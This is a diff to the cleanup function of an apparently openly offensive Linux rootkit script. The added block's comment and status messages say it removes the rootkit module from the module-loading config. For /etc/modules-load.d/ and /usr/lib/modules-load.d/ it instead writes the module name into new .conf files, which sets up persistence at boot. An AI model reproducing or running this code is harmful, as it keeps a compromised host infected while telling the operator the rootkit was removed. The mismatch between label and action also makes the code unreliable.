@@ -100,6 +100,24 @@ revert_rootkit() {
 		done
 	fi
 
+	# Remove the module from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
+	echo "[+] Removing rootkit module from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/..."
+	if [ -d "/etc/modules-load.d" ]; then
+		echo "${rk_name}" > /etc/modules-load.d/${rk_name}.conf
+	fi
+
+	if [ -d "/usr/lib/modules-load.d" ]; then
+		echo "${rk_name}" > /usr/lib/modules-load.d/${rk_name}.conf
+	fi
+
+	if [ -f "/etc/modules" ]; then
+		if grep -q "^${rk_name}$" /etc/modules; then
+			sed -i "/^${rk_name}$/d" /etc/modules
+		fi
+	fi
+
+	echo "[+] Rootkit module removed from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/"
+
 	# Step 4: Remove /dev/shm/.rk directory
 	remove_directory "$rk_path"
 
